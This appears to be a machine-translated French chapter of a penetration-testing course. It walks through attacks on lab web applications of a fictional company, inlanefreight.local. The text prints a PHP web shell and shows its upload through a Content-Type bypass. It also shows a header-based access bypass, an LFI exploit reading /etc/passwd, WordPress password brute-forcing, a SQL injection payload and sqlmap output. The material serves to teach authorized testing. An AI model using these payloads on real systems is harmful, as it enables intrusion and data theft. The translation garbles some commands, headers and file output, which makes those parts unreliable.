Énumération et exploitation Web
==============================

* * * * *

Comme mentionné dans la section précédente, les applications Web sont celles où nous passons généralement la plupart de notre temps lors d'un test d'intrusion externe. Ils présentent souvent une vaste surface d'attaque et peuvent souffrir de nombreuses classes de vulnérabilités qui peuvent conduire à l'exécution de code à distance ou à l'exposition de données sensibles, nous devons donc être minutieux avec eux. Une chose à retenir est qu'il existe une différence entre une `évaluation de la sécurité des applications Web (WASA)` et un `test d'intrusion externe`. Dans un WASA, nous sommes généralement chargés de rechercher et de signaler toutes les vulnérabilités, aussi banales soient-elles (c'est-à-dire une version de serveur Web dans les en-têtes de réponse HTTP, un cookie manquant l'indicateur Secure ou HttpOnly, etc.). Nous ne voulons pas nous enliser avec ces types de résultats lors d'un test de pénétration externe, car nous avons généralement beaucoup de terrain à couvrir. Le document sur l'étendue des travaux (SoW) doit clairement différencier les deux types d'évaluation. Il doit indiquer explicitement que lors d'un test d'intrusion externe, nous effectuerons des tests d'application Web "cursifs", en recherchant les vulnérabilités à haut risque. Si nous n'avons pas beaucoup de résultats du tout, nous pouvons approfondir les applications Web et nous pouvons toujours inclure une `Recommandation de meilleures pratiques` ou ` Informationnelle` résultat qui répertorie plusieurs en-têtes de réponse HTTP courants liés à la sécurité problèmes que nous voyons tout le temps, entre autres problèmes mineurs. De cette façon, nous avons rempli le contrat en nous attaquant aux gros problèmes tels que l'injection SQL, le téléchargement de fichiers sans restriction, XSS, XXE, les attaques par inclusion de fichiers, les injections de commandes, etc., mais nous nous sommes couverts de la découverte d'informations au cas où le client viendrait retour demandant pourquoi nous n'avons pas signalé X.

* * * * *

Énumération d'applications Web
---------------------------

Le moyen le plus rapide et le plus efficace de parcourir un ensemble d'applications Web consiste à utiliser un outil tel que [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) pour prendre des captures d'écran de chaque application Web, comme indiqué dans `Attacking Common Module Applications dans la section [Application Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1088) . Ceci est particulièrement utile si nous avons une portée énorme pour notre évaluation et qu'il n'est pas possible de parcourir chaque application Web une à la fois. Dans notre cas, nous avons `11` sous-domaines/vhosts (pour l'instant), il vaut donc la peine de lancer EyeWitness pour nous aider car nous voulons être aussi efficaces que possible pour donner au client la meilleure évaluation possible. Cela signifie accélérer toutes les tâches qui peuvent être exécutées "plus rapidement" et plus efficacement "sans risquer de manquer des choses". L'automatisation est géniale, mais si nous manquons la moitié de ce que nous recherchons, alors l'automatisation fait plus de mal que de bien. Assurez-vous de comprendre ce que font vos outils et vérifiez périodiquement les choses pour vous assurer que vos outils et tous les scripts personnalisés fonctionnent comme prévu.

```
dsgsec@htb[/htb]$ cat ilfreight_subdomains

inlanefreight.local
blog.inlanefreight.local
carrieres.inlanefreight.local
dev.inlanefreight.local
gitlab.inlanefreight.local
ir.inlanefreight.local
status.inlanefreight.local
support.inlanefreight.local
tracking.inlanefreight.local
vpn.inlanefreight.local
monitoring.inlanefreight.local

```

Nous pouvons alimenter EyeWitness avec un fichier Nmap .xml ou un scan Nessus, ce qui est utile lorsque nous avons un large scope avec de nombreux ports ouverts, ce qui peut souvent être le cas lors d'un test de pénétration interne. Dans notre cas, nous utiliserons simplement le drapeau `-f` pour lui donner la liste des sous-domaines dans un fichier texte que nous avons énuméré précédemment.

```
dsgsec@htb[/htb]$ témoin oculaire -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################# ##############################
# Témoin oculaire #
################################################# ##############################
# Sécurité FortyNorth - https://www.fortynorthsecurity.com #
################################################# ##############################

Démarrage des requêtes Web (11 hôtes)
Tentative de capture d'écran http://inlanefreight.local
Tentative de capture d'écran http://blog.inlanefreight.local
Tentative de capture d'écran http://careers.inlanefreight.local
Tentative de capture d'écran http://dev.inlanefreight.local
Tentative de capture d'écran http://gitlab.inlanefreight.local
Tentative de capture d'écran http://ir.inlanefreight.local
Tentative de capture d'écran http://status.inlanefreight.local
Tentative de capture d'écran http://support.inlanefreight.local
Tentative de capture d'écran http://tracking.inlanefreight.local
Tentative de capture d'écran http://vpn.inlanefreight.local
Tentative de capture d'écran http://monitoring.inlanefreight.local
Terminé en 34,79010033607483 secondes

[*] Fait! Rapport rédigé dans le dossier /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness !
Souhaitez-vous ouvrir le rapport maintenant ? [O/n]
n

```

![texte] (https://academy.hackthebox.com/storage/modules/163/ilfreight_eyewitness.png)

Les résultats d'EyeWitness nous montrent plusieurs hôtes très intéressants, dont chacun pourrait potentiellement être exploité pour prendre pied dans le réseau interne. Travaillons à travers eux un par un.

* * * * *

blog.inlanefreight.local
------------------------

Le premier est le sous-domaine `blog.inlanefreight.local` . À première vue, cela semble prometteur. Le site semble être une installation Drupal oubliée ou peut-être un site de test qui a été mis en place et jamais renforcé. Nous pouvons consulter le [Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089) du module `Attacking Common Applications` pour avoir des idées.

![texte](https://academy.hackthebox.com/storage/modules/163/drupal.png)

En utilisant `cURL`, nous pouvons voir que Drupal 9 est utilisé.

```
dsgsec@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Générateur" content="Drupal 9 (https://www.drupal.org)" />
       <span>Propulsé par <a href="https://www.drupal.org">Drupal</a></span>

```

Une recherche rapide sur Google nous montre que la version stable actuelle de Drupal destinée à la production est [release 9.4](https://www.drupal.org/project/drupal/releases), nous devrons donc probablement avoir de la chance et trouver une sorte d'une mauvaise configuration, comme un mot de passe administrateur faible pour abuser des fonctionnalités intégrées ou d'un plugin vulnérable. Les vulnérabilités bien connues telles que `Drupalgeddon 1-3` n'affectent pas la version 9.x de Drupal, c'est donc une impasse. Essayer de se connecter avec quelques combinaisons de mots de passe faibles telles que `admin:admin`, `admin:Welcome1`, etc., ne porte pas ses fruits. Tenter d'enregistrer un utilisateur échoue également, nous passons donc à l'application suivante.

Nous avons pu noter dans notre rapport que cette instance Drupal semble ne pas être utilisée et pourrait valoir la peine d'être supprimée pour réduire davantage la surface d'attaque externe globale.

* * * * *

carrieres.inlanefreight.local
---------------------------

Vient ensuite le sous-domaine des carrières. Ces types de sites permettent souvent à un utilisateur de créer un compte, de télécharger un CV et éventuellement une photo de profil. Cela pourrait être une piste d'attaque intéressante. En naviguant d'abord sur la page de connexion `http://careers.inlanefreight.local/login`, nous pouvons essayer quelques contournements d'authentification courants et essayer de fuzzer le formulaire de connexion pour tenter de contourner l'authentification ou provoquer une sorte de message d'erreur ou de délai qui être indicatif d'une injection SQL. Comme toujours, nous testons quelques combinaisons de mots de passe faibles telles que `admin:admin`. Nous devrions également toujours tester les formulaires de connexion (et les formulaires de mot de passe oublié s'ils existent) pour l'énumération des noms d'utilisateur, mais aucun n'est apparent dans ce cas.

La page `http://careers.inlanefreight.local/apply` nous permet de postuler à un emploi et de télécharger un CV. Le test de cette fonctionnalité montre qu'elle autorise le téléchargement de n'importe quel type de fichier, mais la réponse HTTP n'indique pas où se trouve le fichier après le téléchargement. Le forçage brut de répertoire ne produit aucun répertoire intéressant tel que `/files` ou `/uploads` qui pourrait héberger un shell Web si nous parvenons à télécharger un fichier malveillant.

C'est toujours une bonne idée de tester la fonctionnalité d'enregistrement des utilisateurs sur toutes les applications Web que nous rencontrons, car elles peuvent entraîner toutes sortes de problèmes. Dans la box HTB [Academy](https://0xdf.gitlab.io/2021/02/27/htb-academy.html), il est possible de s'inscrire sur une application web et de modifier notre rôle à celui d'un admin chez moment de l'inscription. Cela a été inspiré par une découverte réelle de test de pénétration externe où j'ai pu m'inscrire sur une application Web accessible sur Internet pour jusqu'à cinq rôles d'utilisateur différents. Une fois connecté à cette application, toutes sortes de vulnérabilités IDOR existaient, entraînant une autorisation cassée sur de nombreuses pages.

Allons-y et créons un compte sur `http://careers.inlanefreight.local/register` et regardons autour de nous. Nous enregistrons un compte avec de fausses informations : `test@test.com` et les informations d'identification `pentester:Str0ngP@ssw0rd !`. Parfois, nous devrons utiliser une adresse e-mail réelle pour recevoir un lien d'activation. Nous pouvons utiliser un service de messagerie jetable tel que [10 Minute Mail](https://10minutemail.com/) pour ne pas encombrer notre boîte de réception ou conserver un compte factice avec ProtonMail mail ou similaire uniquement à des fins de test. Vous serez heureux de ne pas avoir utilisé votre adresse e-mail réelle la première fois que Burp Suite Active Scanner accède à un formulaire et vous envoie plus de 1 000 e-mails en succession rapide. Inscrivez-vous également avec des informations d'identification suffisamment solides. Vous ne voulez pas introduire un problème de sécurité dans l'application Web que vous êtes chargé de tester en vous enregistrant avec des informations d'identification telles que `test:test` qui pourraient potentiellement rester sur l'application longtemps après la fin du test (bien que nous devrions, bien sûr, énumérez dans une annexe de notre rapport toutes les modifications apportées lors des tests, même en vous inscrivant sur un site Web destiné au public).

Une fois inscrit, nous pouvons nous connecter et naviguer. Nous sommes accueillis par notre page de profil à `http://careers.inlanefreight.local/profile?id=9`. Tentative de fuzz du paramètre `id` pour SQLi, injection de commande, inclusion de fichier, XSS, etc.,ne s'avère pas fructueuse. Le numéro d'identification lui-même est intéressant. Ajuster ce nombre nous montre que nous pouvons accéder aux profils des autres utilisateurs et voir à quels emplois ils ont postulé. Il s'agit d'un exemple classique d'une vulnérabilité " Insecure Direct Object Reference (IDOR)" et mériterait certainement d'être signalé en raison du potentiel d'exposition de données sensibles.

Après avoir épuisé toutes les options ici, nous repartons avec une vulnérabilité à signaler décente à ajouter à notre liste de résultats et à passer à l'application Web suivante. Nous pouvons utiliser n'importe quel outil de forçage de répertoire ici, mais nous utiliserons [Gobuster](https://github.com/OJ/gobuster).

* * * * *

dev.inlanefreight.local
------------------------

L'application Web sur `http://dev.inlanefreight.local` est simple mais attire l'attention. Tout ce qui contient `dev` dans l'URL ou le nom est intéressant, car cela pourrait potentiellement être accidentellement exposé et criblé de défauts/pas prêt pour la production. L'application présente un simple formulaire de connexion intitulé "Key Vault". Cela ressemble à un gestionnaire de mots de passe maison ou similaire et pourrait entraîner une exposition considérable des données si nous pouvons entrer. . Essayons d'abord avec la liste de mots `common.txt` en utilisant les extensions de fichier `.php` pour la première exécution.

```
dsgsec@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

================================================= =============
Gobuster v3.1.0
par OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
================================================= =============
[+] URL : http://dev.inlanefreight.local
[+] Méthode : GET
[+] Fils : 300
[+] Liste de mots : /usr/share/wordlists/dirb/common.txt
[+] Codes d'état négatifs : 404
[+] Agent utilisateur : gobuster/3.1.0
[+] Extensions : php
[+] Délai d'attente : 10 s
================================================= =============
2022/06/20 22:04:48 Démarrage de gobuster en mode d'énumération de répertoire
================================================= =============
/.htaccess (Statut : 403) [Taille : 288]
/.htpasswd (Statut : 403) [Taille : 288]
/.hta (Statut : 403) [Taille : 288]
/.htpasswd.php (Statut : 403) [Taille : 288]
/.hta.php (Statut : 403) [Taille : 288]
/css (Statut : 301) [Taille : 332] [--> http://dev.inlanefreight.local/css/]
/images (Statut : 301) [Taille : 335] [--> http://dev.inlanefreight.local/images/]
/index.php (Statut : 200) [Taille : 2048]
/index.php (Statut : 200) [Taille : 2048]
/js (Statut : 301) [Taille : 331] [--> http://dev.inlanefreight.local/js/]
/statut-serveur (Statut : 403) [Taille : 288]
/uploads (Statut : 301) [Taille : 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php (Statut : 200) [Taille : 14]
/.htaccess.php (Statut : 403) [Taille : 288]

================================================= =============
2022/06/20 22:05:02 Terminé
================================================= =============

```

Nous obtenons quelques hits intéressants. Les fichiers avec un code d'erreur `403` interdit signifient généralement que les fichiers existent, mais le serveur Web ne nous permet pas d'y accéder de manière anonyme. Les pages `uploads` et `upload.php` attirent immédiatement notre attention. Si nous sommes en mesure de télécharger un shell Web PHP, il est probable que nous puissions y accéder directement dans le répertoire `/uploads` , dont la liste des répertoires est activée. Nous pouvons noter cela comme un résultat valide à faible risque, `Liste des répertoires activée`, et capturer les preuves nécessaires pour rendre la rédaction du rapport rapide et indolore. La navigation vers `/upload.php` nous donne un message d'erreur `403 Forbidden` et rien de plus, ce qui est intéressant car le code d'état est un code de réussite `200 OK` . Creusons cela plus profondément.

Nous aurons besoin de Burp Suite ici pour capturer la demande et voir si nous pouvons comprendre ce qui se passe. Si nous capturons la requête et l'envoyons à Burp Repeater, puis redemandons la page à l'aide de la méthode `OPTIONS` , nous constatons que différentes méthodes sont autorisées : `GET,POST,PUT,TRACK,OPTIONS`. En parcourant les différentes options, chacune nous donne une erreur de serveur jusqu'à ce que nous essayions la méthode `TRACK` et constations que l'en-tête `X-Custom-IP-Authorization:` est défini dans la réponse HTTP. Nous pouvons consulter les modules [Web Attacks](https://academy.hackthebox.com/module/134/section/1159) sur `HTTP Verb Tampering` pour un rappel sur ce type d'attaque.

![texte](https://academy.hackthebox.com/storage/modules/163/track_method.png)

Jouer un peu avec la requête et ajouter l'en-tête `X-Custom-IP-Authorization : 127.0.0.1` à la requête HTTP dans Burp Repeater, puis demander à nouveau la page avec la méthode `TRACK` donne à nouveau un résultat intéressant. Nous voyons ce qui semble être un formulaire de téléchargement de fichier dans le corps de la réponse HTTP.

![texte](https://academy.hackthebox.com/storage/modules/163/track_method_auth.png)

Si nous faisons un clic droit n'importe où dans la fenêtre `Response` dans `Repeater` , nous pouvons sélectionner `show response in browser`, copier l'URL résultante et la demander dans le navigateur que nous utilisons avec le proxy Burp. Une plateforme de retouche photo se charge pour nous.

![texte](https://academy.hackthebox.com/storage/modules/163/pixel_shop.png)

Nous pouvons cliquer sur le bouton `Parcourir` et essayer de télécharger un simple webshell avec le contenu suivant :

Code : php

```
<?php system($_GET['cmd']); ?>

```

Enregistrez le fichier sous `5351bf7271abaa2267e03c9ef6393f13.php` ou quelque chose de similaire. C'est une bonne pratique de créer des noms de fichiers aléatoires lors du téléchargement d'un shell Web sur un site Web public afin qu'un attaquant aléatoire ne se produise pas dessus. Dans notre cas, nous voudrions utiliser quelque chose de protégé par un mot de passe ou limité à notre adresse IP puisque la liste des répertoires est activée, et n'importe qui peut parcourir le répertoire `/uploads` et le trouver. Tenter de télécharger le fichier `.php` entraîne directement une erreur : "`Les fichiers JPG, JPEG, PNG et GIF sont autorisés.`", ce qui indique qu'une validation côté client faible est probablement en place. Nous pouvons récupérer la requête POST, l'envoyer à nouveau à Repeater et essayer de modifier l'en-tête `Content-Type:` dans la requête pour voir si nous pouvons tromper l'application pour qu'elle accepte notre fichier comme valide. Nous allons essayer de remplacer l'en-tête `Content-Type : image/png` pour faire passer notre shell Web comme un fichier image PNG valide. Ça marche! Nous obtenons la réponse suivante : `File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php`.

Nous pouvons maintenant utiliser `cURL` pour interagir avec ce shell Web et exécuter des commandes sur le serveur Web.

```
dsgsec@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

En vérifiant l'adressage IP de l'hôte, il ne semble pas que nous ayons atterri à l'intérieur du réseau interne Inlanefreight car l'adresse IP n'est pas dans la portée du réseau interne. Il ne s'agit peut-être que d'un serveur Web autonome, nous allons donc continuer.

```
dsgsec@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

172.18.0.3

```

À partir de là, nous pouvons énumérer davantage l'hôte, en recherchant des données sensibles, noter deux autres résultats : `Téléchargement de fichiers HTTP` et `Téléchargement de fichiers sans restriction`, et passer à l'hôte suivant.

* * * * *

ir.inlanefreight.local
----------------------

La prochaine cible de notre liste est `http://ir.inlanefreight.local`, le portail de relations avec les investisseurs de l'entreprise hébergé avec WordPress. Pour cela, nous pouvons consulter la section [WordPress - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1100) du module `Attaquer les applications courantes` . Lançons `WPScan` et voyons ce que nous pouvons énumérer à l'aide de l'indicateur `-ap` pour énumérer tous les plug-ins.

```
dsgsec@htb[/htb]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] WordPress version 6.0 identifiée (Dernière sortie le 2022-05-24).
  | Trouvé par : Générateur RSS (Détection passive)
  | - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
  | - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] Thème WordPress utilisé : cbusiness-investment
  | Emplacement : http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
  | Dernière version : 0.7 (à jour)
  | Dernière mise à jour : 2022-04-25T00:00:00.000Z
  | Lisez-moi : http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
  | URL du style : http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
  | Style: Investissement d'entreprise
  | Style URI : https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
  | Description : Le thème WordPress CBusiness Investment est utilisé pour tous les types d'entreprises. Ce T polyvalent...
  | Auteur : Themescave
  | URI de l'auteur : http://www.themescave.com/
  |
  | Trouvé par: Style CSS dans la page d'accueil (détection passive)
  | Confirmé par : Style CSS dans la page 404 (détection passive)
  |
  | Version : 0,7 (80 % de confiance)
  | Trouvé par : Style (Détection passive)
  | - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Correspondance : 'Version : 0.7'

[+] Énumération de tous les plugins (via des méthodes passives)
[+] Vérification des versions de plugins (via des méthodes passives et agressives)

[i] Plugin(s) identifié(s) :

[+] outils-b2i-investisseur
  | Emplacement : http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
  | Dernière version : 1.0.5 (à jour)
  | Dernière mise à jour : 2022-06-17T15:21:00.000Z
  |
  | Trouvé par : URL de la page d'accueil (détection passive)
  | Confirmé par : URL dans la page 404 (détection passive)
  |
  | Version : 1.0.5 (100 % de confiance)
  | Trouvé par : paramètre de requête (détection passive)
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
  | Confirmé par : Lisez-moi - Balise stable (détection agressive)
  | - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
  | Emplacement : http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
  | Dernière version : 1.0 (à jour)
  | Dernière mise à jour : 2014-09-19T07:52:00.000Z
  |
  | Trouvé par : URL de la page d'accueil (détection passive)
  | Confirmé par : URL dans la page 404 (détection passive)
  |
  | Version : 1.0 (80 % de confiance)
  | Trouvé par : Lisez-moi - Balise stable (détection agressive)
  | - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] Aucun jeton d'API WPScan n'a été fourni, par conséquent, les données de vulnérabilité n'ont pas été générées.
[!] Vous pouvez obtenir un jeton API gratuit avec 25 requêtes quotidiennes en vous inscrivant sur https://wpscan.com/register

[+] Terminé : lun. 20 juin 23:07:09 2022
[+] Demandes effectuées : 35
[+] Requêtes mises en cache : 7
[+] Données envoyées : 9,187 Ko
[+] Données reçues : 164,854 Ko
[+] Mémoire utilisée : 224.816 M

```

De l'analyse, nous pouvons déduire les informations suivantes :

- La version principale de WordPress est la plus récente (6.0 au moment de la rédaction)
- Le thème utilisé est `cbusiness-investment`
- Le plugin `b2i-investor-tools` est installé
- Le plugin `mail-masta` est installé

Le plug-in `Mail Masta` est un plug-in plus ancien présentant plusieurs vulnérabilités connues. Nous pouvons utiliser [cet](https://www.exploit-db.com/exploits/50226) exploit pour lire des fichiers sur le système de fichiers sous-jacent en exploitant une vulnérabilité d'inclusion de fichiers locaux (LFI).

```
dsgsec@htb[/htb]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

racine:x:0:0:racine:/racine:/bin/bash
démon:x:1:1:démon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
jeux:x:5:60:jeux:/usr/jeux:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sauvegarde:x:34:34:sauvegarde:/var/sauvegardes:/usr/sbin/nologin
list:x:38:38:Gestionnaire de liste de diffusion :/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
personne:x:65534:65534:personne:/inexistant:/usr/sbin/nologin
_apt:x:100:65534::/inexistant:/usr/sbin/nologin

```

Nous pouvons ajouter une autre découverte à notre liste : `Inclusion de fichiers locaux (LFI)`. Ensuite, passons à autre chose et voyons si nous pouvons énumérer les utilisateurs de WordPress à l'aide de `WPScan`.

```
dsgsec@htb[/htb]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] Énumération des utilisateurs (via des méthodes passives et agressives)
  ID d'auteur Brute Forcing - Heure : 00:00:02 <===================================> ( 10 / 10) 100,00 % Heure : 00:00:02

[i] Utilisateur(s) identifié(s) :

[+] ilfreightwp
  | Trouvé par : Générateur RSS (Détection passive)
  | Confirmé par:
  | Wp Json Api (détection agressive)
  | - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
  | Générateur RSS (Détection Agressive)
  | Sitemap de l'auteur (détection agressive)
  | - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
  | Identifiant d'auteur Brute Forcing - Modèle d'auteur (détection agressive)
  | Messages d'erreur de connexion (détection agressive)

[+] tom
  | Trouvé par : Identifiant de l'auteur Brute Forcing - Motif de l'auteur (détection agressive)
  | Confirmé par : Messages d'erreur de connexion (détection agressive)

[+] Jacques
  | Trouvé par : Identifiant de l'auteur Brute Forcing - Motif de l'auteur (détection agressive)
  | Confirmé par : Messages d'erreur de connexion (détection agressive)

[+] Jean
  | Trouvé par : Identifiant de l'auteur Brute Forcing - Motif de l'auteur (détection agressive)
  | Confirmé par : Messages d'erreur de connexion (détection agressive)

[!] Aucun jeton d'API WPScan n'a été fourni, par conséquent, les données de vulnérabilité n'ont pas été générées.
[!] Vous pouvez obtenir un jeton API gratuit avec 25 requêtes quotidiennes en vous inscrivant sur https://wpscan.com/register

[+] Terminé : lun. 20 juin 23:14:33 2022
[+] Demandes effectuées : 28
[+] Requêtes mises en cache : 37
[+] Données envoyées : 8,495 Ko
[+] Données reçues : 269 719 Ko
[+] Mémoire utilisée : 176,859 Mo
[+] Temps écoulé : 00:00:0

```

On retrouve plusieurs utilisateurs :

- ilfreightwp
-   à M
-   James
-   John

Essayons de forcer brutalement l'un des mots de passe du compte en utilisant [this](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) liste de mots de `SecLists` GitHubdépôt. En utilisant `WPScan` à nouveau, nous obtenons un résultat pour le compte `ilfreightwp` .

```
dsgsec@htb[/htb]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp

<SNIP>

[+] Effectuer une attaque par mot de passe sur Xmlrpc contre 1 utilisateur/s
[SUCCÈS] - ilfreightwp / mot de passe1
Essayer ilfreightwp / 123123 Heure : 00:00:00 <=== > (10 / 109) 9.17% ETA : ??:??:??

[!] Combinaisons valides trouvées :
  | Nom d'utilisateur : ilfreightwp, Mot de passe : password1

[!] Aucun jeton d'API WPScan n'a été fourni, par conséquent, les données de vulnérabilité n'ont pas été générées.
[!] Vous pouvez obtenir un jeton API gratuit avec 25 requêtes quotidiennes en vous inscrivant sur https://wpscan.com/register

[+] Terminé : lun. 20 juin 23:31:34 2022
[+] Demandes effectuées : 186
[+] Requêtes mises en cache : 7
[+] Données envoyées : 54,2 Ko
[+] Données reçues : 253 754 Ko
[+] Mémoire utilisée : 241,836 Mo
[+] Temps écoulé : 00:00:16

```

À partir de là, nous pouvons accéder à `http://ir.inlanefreight.local/wp-login.php` et nous connecter à l'aide des informations d'identification `ilfreightwp:password1`. Une fois connecté, nous serons dirigés vers `http://ir.inlanefreight.local/wp-admin/` où nous pourrons accéder à `http://ir.inlanefreight.local/wp-admin/theme-editor. php?file=404.php&theme=twentytwenty` pour modifier le fichier 404.php du thème inactif `Twenty Twenty` et ajouter un shell Web PHP pour obtenir l'exécution de code à distance. Après avoir modifié cette page et exécuté le code en suivant les étapes de la section [Attaquer WordPress](https://academy.hackthebox.com/module/113/section/1208) du module `Attaquer les applications courantes` , nous pouvons encore enregistrer une autre constatation pour ` Weak WordPress Admin Credentials` et recommande à notre client de mettre en œuvre plusieurs mesures de renforcement s'il envisage de laisser ce site WordPress exposé à l'extérieur.

* * * * *

status.inlanefreight.local
--------------------------

Ce site ressemble à un autre site oublié qui ne devrait pas être exposé à Internet. Il semble que ce soit une sorte d'application interne pour rechercher dans les journaux. La saisie d'un guillemet simple (`'`) génère un message d'erreur MySQL qui indique la présence d'une vulnérabilité d'injection SQL : `Vous avez une erreur dans votre syntaxe SQL ; consultez le manuel correspondant à la version de votre serveur MySQL pour connaître la bonne syntaxe à utiliser près de '%'' à la ligne 1`. Nous pouvons exploiter cela manuellement en utilisant une charge utile telle que :

Code : sql

```
' union select null, database(), user(), @@version -- //

```

Ceci est un exemple d'[attaque UNION par injection SQL](https://academy.hackthebox.com/module/33/section/806).

Nous pouvons également utiliser sqlmap pour exploiter cela également. Tout d'abord, capturez la requête POST à l'aide de Burp, enregistrez-la dans un fichier et marquez le paramètre `searchitem` avec un `*` afin que sqlmap sache où injecter.

```
POST/HTTP/1.1
Hôte : status.inlanefreight.local
Longueur du contenu : 14
Cache-Control : max-age=0
Demandes de mise à niveau non sécurisées : 1
Origine : http://status.inlanefreight.local
Type de contenu : application/x-www-form-urlencoded
Agent utilisateur : Mozilla/5.0 (Windows NT 10.0 ; Win64 ; x64) AppleWebKit/537.36 (KHTML, comme Gecko) Chrome/99.0.4844.74 Safari/537.36
Accepter : text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3; q=0,9
Référent : http://status.inlanefreight.local/
Accepter-Encodage : gzip, dégonfler
Accept-Langue : en-US,en;q=0.9
Cookie : PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connexion : fermer

élément de recherche=*

```

Ensuite, nous exécutons cela via sqlmap comme suit :

```
dsgsec@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql

<SNIP>

[00:07:24] [INFO] (personnalisé) Le paramètre POST '#1*' est 'Requête MySQL UNION (NULL) - 1 à 20 colonnes' injectable
(personnalisé) Le paramètre POST '#1*' est vulnérable. Voulez-vous continuer à tester les autres (le cas échéant) ? [o/N] n
sqlmap a identifié le(s) point(s) d'injection suivant(s) avec un total de 59 requêtes HTTP(s) :
---
Paramètre : #1* (POST (personnalisé))
     Type : aveugle booléen
     Titre : AND booléen aveugle - Clause WHERE ou HAVING (commentaire MySQL)
     Charge utile : élément de recherche=%' ET 6921=6921#

     Type : basé sur les erreurs
     Titre : MySQL >= 5.6 basé sur les erreurs AND - Clause WHERE, HAVING, ORDER BY ou GROUP BY (GTID_SUBSET)
     Charge utile : searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

     Type : aveugle basé sur le temps
     Titre : MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Charge utile : élément de recherche = %' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

     Tapez : Requête UNION
     Titre : Requête MySQL UNION (NULL) - 4 colonnes
     Charge utile : élément de recherche=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x7 16a7a7171), NULL#
---
[00:07:37] [INFO] le SGBD back-end est MySQL
système d'exploitation du serveur Web : Linux Ubuntu 20.04 ou 19.10 ou 20.10 (eoan ou focal)
technologie des applications Web : Apache 2.4.41
SGBD back-end : MySQL >= 5.6
[00:07:38] [INFO] a récupéré des données enregistrées dans des fichiers texte sous '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] se terminant à 00:07:38 /2022-06-21/

```

Ensuite, nous pouvons énumérer les bases de données disponibleset voyez que la base de données `status` est particulièrement intéressante :

```
dsgsec@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql --dbs

<SNIP>

---
[00:09:24] [INFO] tester MySQL
[00:09:24] [INFO] confirmant MySQL
[00:09:24] [INFO] le SGBD back-end est MySQL
